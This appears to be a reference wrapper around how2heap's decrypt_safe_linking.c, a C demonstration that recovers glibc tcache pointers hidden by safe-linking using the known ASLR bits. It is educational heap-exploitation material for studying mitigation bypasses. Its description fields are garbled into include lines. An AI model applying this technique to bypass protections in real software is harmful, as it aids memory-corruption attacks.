---
title: "Decrypt Safe Linking (how2heap)"
category: "pwn"
subcategory: "heap"
type: "script"
tags: ["how2heap", "decrypt-safe-linking.c", "safe-linking", "aslr", "png-chunks", "decrypt-safe-linking", "pwn"]
summary: "include <stdio.h> include <stdlib.h> include <assert.h>"
tools: ["how2heap"]
source:
  name: "shellphish/how2heap"
  url: "https://github.com/shellphish/how2heap/blob/02da6aa26a44/glibc_2.35/decrypt_safe_linking.c"
license: "MIT"
---

## What it does

include <stdio.h> include <stdlib.h> include <assert.h>

## Where it lives

- Vendored locally at `vendor/how2heap/glibc_2.35/decrypt_safe_linking.c`
- Upstream: <https://github.com/shellphish/how2heap/blob/02da6aa26a44/glibc_2.35/decrypt_safe_linking.c>

## Usage

```bash
# read or run it straight from the vendored copy
$EDITOR vendor/how2heap/glibc_2.35/decrypt_safe_linking.c
gcc -g -o /tmp/decrypt_safe_linking vendor/how2heap/glibc_2.35/decrypt_safe_linking.c && /tmp/decrypt_safe_linking
```

## Code

```c
#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

long decrypt(long cipher)
{
	puts("The decryption uses the fact that the first 12bit of the plaintext (the fwd pointer) is known,");
	puts("because of the 12bit sliding.");
	puts("And the key, the ASLR value, is the same with the leading bits of the plaintext (the fwd pointer)");
	long key = 0;
	long plain;

	for(int i=1; i<6; i++) {
		int bits = 64-12*i;
		if(bits < 0) bits = 0;
		plain = ((cipher ^ key) >> bits) << bits;
		key = plain >> 12;
		printf("round %d:\n", i);
		printf("key:    %#016lx\n", key);
		printf("plain:  %#016lx\n", plain);
		printf("cipher: %#016lx\n\n", cipher);
	}
	return plain;
}

int main()
{
	/*
	 * This technique demonstrates how to recover the original content from a poisoned
	 * value because of the safe-linking mechanism.
	 * The attack uses the fact that the first 12 bit of the plaintext (pointer) is known
	 * and the key (ASLR slide) is the same to the pointer's leading bits.
	 * As a result, as long as the chunk where the pointer is stored is at the same page
	 * of the pointer itself, the value of the pointer can be fully recovered.
	 * Otherwise, we can also recover the pointer with the page-offset between the storer
	 * and the pointer. What we demonstrate here is a special case whose page-offset is 0. 
	 * For demonstrations of other more general cases, plz refer to 
	 * https://github.com/n132/Dec-Safe-Linking
	 */

	setbuf(stdin, NULL);
	setbuf(stdout, NULL);

	// step 1: allocate chunks
	long *a = malloc(0x20);
	long *b = malloc(0x20);
	printf("First, we create chunk a @ %p and chunk b @ %p\n", a, b);
	malloc(0x10);
	puts("And then create a padding chunk to prevent consolidation.");


	// step 2: free chunks
	puts("Now free chunk a and then free chunk b.");
	free(a);
	free(b);
	printf("Now the freelist is: [%p -> %p]\n", b, a);
	printf("Due to safe-linking, the value actually stored at b[0] is: %#lx\n", b[0]);

	// step 3: recover the values
	puts("Now decrypt the poisoned value");
	long plaintext = decrypt(b[0]);

	printf("value: %p\n", a);
	printf("recovered value: %#lx\n", plaintext);
	assert(plaintext == (long)a);
}

```

## Attribution

- **Author:** Shellphish
- **Repository:** <https://github.com/shellphish/how2heap> (commit `02da6aa26a44`)
- **Licence:** MIT — see `vendor/how2heap/LICENSE`

This file is a wrapper for search and reference. The code is the original authors' work, redistributed unmodified under its own licence.
